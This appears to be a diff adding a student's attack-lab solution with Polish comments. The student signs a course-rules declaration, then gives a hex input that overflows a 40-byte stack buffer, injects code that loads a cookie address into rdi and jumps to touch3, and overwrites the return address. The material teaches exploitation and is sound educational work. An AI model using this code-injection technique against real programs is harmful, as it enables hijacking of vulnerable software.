@@ -1,0 +1,27 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Bieniek, 347165
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Bieniek, 347165
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ Ustawiamy w rdi adres char * w którym jest tekstem ciasteczko
+ */
+
+48 c7 c7 48 b6 64 55 /* movq $0x5564b648, %rdi; (adres stosu + 48) */
+68 32 1c 40 00 c3 /* push $0x401c32; ret; Skok do touch3 */
+00 00 00 /* wyrównanie do 8 */
+de ad c0 de de ad c0 de /* dopełnienie do 40 bajtów bufora */
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+18 b6 64 55 00 00 00 00 /* skaczemy tu na adres na stosie, pod którym jest instrukcja na górze */
+35 34 61 65 63 33 63 64 /* ciasteczko w ascii */
